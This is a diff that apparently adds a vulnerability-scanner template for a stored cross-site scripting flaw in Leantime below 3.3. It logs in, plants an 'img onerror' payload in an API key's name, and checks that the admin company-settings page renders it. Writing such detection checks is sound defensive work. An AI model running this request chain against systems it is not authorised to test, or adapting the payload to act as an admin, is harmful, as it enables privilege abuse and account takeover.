@@ -1,0 +1,68 @@
+id: leantime-stored-xss
+
+info:
+  name: Leantime < 3.3 = Cross-Site Scripting
+  author: iamnoooob,rootxharsh,pdresearch
+  severity: high
+  description: |
+    Any low privileged user like manager, or editor, can create an API key with XSS payload. When admin will visit the Company page, the XSS will automatically get triggerred leading to the unauthorized action performed from the ADMIN account. Like, removing any user, or adding someone else as high privilege, and many more.
+  reference:
+    - https://github.com/advisories/GHSA-c39w-3pjx-qc7m
+  tags: leantime,xss,stored,authenticated
+
+flow: http(1) && http(2) && http(3)
+
+variables:
+  username: "{{username}}"
+  password: "{{password}}"
+
+http:
+  - raw:
+      - |
+        POST /auth/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        redirectUrl=http%253A%252F%252F{{Hostname}}%252Fdashboard%252Fhome&username={{username}}&password={{password}}&login=Login
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - /dashboard/home
+
+  - raw:
+      - |
+        POST /api/newApiKey HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        save=1&firstname=%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&role=5&status=a&submitAction=Save
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'message: "notification.api_key_created", style: "success"'
+
+  - raw:
+      - |
+        GET /setting/editCompanySettings/ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<img src=x onerror=alert(document.domain)>'
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a004730450220729eb0c0f84ee77eddd40e4978d0dfb3cbeec5e4e848b5460ee9cb8f83e9f626022100c70ac67b7b4720d20f791d3cdb29e99544d6780a70c78078acce29fb669aa4c1:922c64590222798bb761d5b6d8e72950
